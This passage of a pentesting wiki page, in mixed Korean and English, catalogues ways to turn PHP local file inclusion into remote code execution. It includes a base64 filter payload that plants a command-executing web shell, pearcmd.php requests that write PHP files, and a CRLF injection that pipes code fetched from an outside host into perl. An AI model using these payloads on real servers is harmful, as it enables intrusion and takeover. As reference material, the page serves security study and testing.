### **를 통해** **vsftpd** _**로그**_

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 절차를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP payload를 주입하세요.
2. 주입 후 LFI를 이용해 서버 로그 _**/var/log/vsftpd.log**_를 가져옵니다.

### php base64 filter를 통해 (base64 사용)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)은 **php filters to generate arbitrary content**를 사용해 출력을 생성할 수 있다고 설명합니다. 요약하면 include에 사용할 **generate arbitrary php code**를 파일로 **without needing to write** 하지 않고도 생성할 수 있다는 뜻입니다.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

파일을 **Upload** 하면 `/tmp`에 **temporary**로 저장되고, 같은 요청에서 **segmentation fault**를 발생시키면 **temporary file won't be deleted** 상태가 되어 해당 파일을 찾을 수 있습니다.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Local File Inclusion을 발견했고 PHP 앞에 **Nginx**가 동작 중이라면 다음 기법으로 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

세션이 없고 `session.auto_start`가 `Off`인 상태에서도 Local File Inclusion을 찾았다면, **multipart POST** 데이터에 `PHP_SESSION_UPLOAD_PROGRESS`를 제공하면 PHP가 자동으로 세션을 활성화합니다. 이를 악용해 RCE를 얻을 수 있습니다:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Local File Inclusion을 발견했고 서버가 **Windows**에서 동작한다면 다음 기법으로 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), 스크립트 `/usr/local/lib/phppearcmd.php`는 php docker images에 기본으로 존재합니다. 또한 URL 파라미터에 `=`가 없으면 해당 값이 인수(argument)로 사용된다고 되어 있어 URL을 통해 스크립트에 인수를 전달할 수 있습니다. 참고로 [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) 및 [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)도 참고하세요.

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용하여 RCE를 얻는 예시입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo()를 통해 (file_uploads = on)

만약 **Local File Inclusion**을 발견했고 **phpinfo()**를 노출하는 파일에서 file_uploads = on이면 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure를 통해

만약 **Local File Inclusion**을 발견했고 임시 파일의 경로를 **유출할 수** 있지만 **서버**가 포함할 파일에 PHP 마크가 있는지 **검사**하고 있다면, 이 **Race Condition**으로 그 **검사**를 **우회**해 볼 수 있습니다:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce를 통해

만약 LFI를 악용해 **임시 파일을 업로드**하고 서버가 PHP 실행을 **hang**하게 만들 수 있다면, 몇 시간 동안 파일명을 **brute force**하여 임시 파일을 찾을 수 있습니다:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error로

만약 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` 중 어느 파일이든 포함하면 됩니다. (그 오류를 발생시키려면 같은 파일을 2번 포함해야 합니다).

**이게 어떻게 유용한지는 잘 모르겠지만 가능성은 있습니다.**  
_PHP Fatal Error를 발생시켜도, 업로드된 PHP 임시 파일은 삭제됩니다._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
